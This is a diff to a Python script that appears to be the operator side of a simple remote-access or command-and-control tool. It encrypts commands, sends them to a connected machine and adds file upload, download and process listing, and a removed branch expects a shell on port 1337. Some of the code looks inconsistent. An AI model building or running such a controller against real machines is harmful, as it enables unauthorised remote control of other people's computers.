@@ -70,34 +70,33 @@ def main():
             result = encrypt(command, ci)
             print(result)
             conn.send(result.encode())
-        # elif command == "upload":
-        #     # Ask for source and destination from here
-        #     print("Upload your file")
-        #     file = input("What file do you want to upload: ")
-        #     with open(file, 'rb') as f:
-        #         conte = f.read()
-        #         print(conte)
-        #         conn.send(xor(conte).encode('utf-8'))
-        # elif command == "download":
-        #     # Get the file name from here
-        #     print("Downloading file to current directory")
+        elif command == "upload":
+            # Ask for source and destination from here
+            print("Upload your file")
+            file = input("What file do you want to upload: ")
+            filecon = open(file, "r")
+            line = filecon.readlines()
+            for i in line:
+                conn.send((encrypt(i, ci).encode()))
+        elif command == "download":
+            # Get the file name from here
+            print("Downloading file to current directory")
+            file = input("What file do you want to download: ")
+            result = encrypt(file, ci)
+            print(result)
+            # conn.send(result.encode())
         elif command == "lp":
             print("Listing process....")
             result = encrypt(command, ci)
             print(result)
             conn.send(result.encode())
-        elif command == "shell":
-            # I will have port 1337 open for this
-            print("Receiving a shell on port 1337")
-            result = encrypt(command, s)
-            print(result)
-            # conn.send(result.encode())
         else:
-            result = encrypt(command, s)
+            result = encrypt(command, ci)
             print(result)
+            conn.send(result.encode())
 
-        reply = conn.recv(4096)
-        print("Result:\n " + reply)
+        # reply = conn.recv(4096)
+        # print("Result:\n " + reply)
 
 
 if __name__ == "__main__":
